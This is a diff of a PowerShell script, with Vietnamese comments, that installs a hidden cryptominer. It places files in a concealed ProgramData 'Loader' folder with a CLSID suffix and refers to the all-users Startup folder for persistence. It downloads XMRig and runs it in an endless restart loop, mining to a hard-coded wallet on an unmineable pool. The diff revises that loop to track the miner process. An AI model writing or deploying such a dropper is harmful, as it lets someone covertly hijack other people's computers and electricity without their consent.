@@ -1,4 +1,3 @@
-
 $rdir = "$env:SystemDrive\ProgramData\Loader"
 $dir = "$rdir..{21EC2020-3AEA-1069-A2DD-08002B30309D}"
 $startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
@@ -12,12 +11,17 @@ $zipPath = "$dir\xmrig.zip"
 Invoke-WebRequest -Uri $url -OutFile $zipPath
 Expand-Archive -Path $zipPath -DestinationPath $dir -Force
 
-$xmrigPath = "$dir\xmrig-6.21.0\xmrig.exe"  # Đường dẫn đến xmrig.exe
+$xmrigPath = "$dir\xmrig-6.21.0\xmrig.exe"
 $pool = "stratum+ssl://rx-asia.unmineable.com:443"
 $wallet = "ATOM:cosmos1nqp27fnn3uuyy7xrvu2epdw7592uapmptfx06g.lmaokid"
 $password = "TAOSIEUDEPTRAI"
 
 while ($true) {
-    Start-Process -FilePath $xmrigPath -ArgumentList "-a rx -o $pool -u $wallet -p $password" -NoNewWindow -Wait
-    Start-Sleep -Seconds 5  # Chờ 5 giây trước khi khởi động lại
+    $proc = Start-Process -FilePath $xmrigPath -ArgumentList "-a rx -o $pool -u $wallet -p $password" -NoNewWindow -PassThru
+    Write-Host "XMRig started with PID $($proc.Id)"
+
+    # Kiểm tra nếu process còn chạy
+    while ($proc.HasExited -eq $false) {
+        Start-Sleep -Seconds 1  # Kiểm tra mỗi 5 giây
+    }
 }
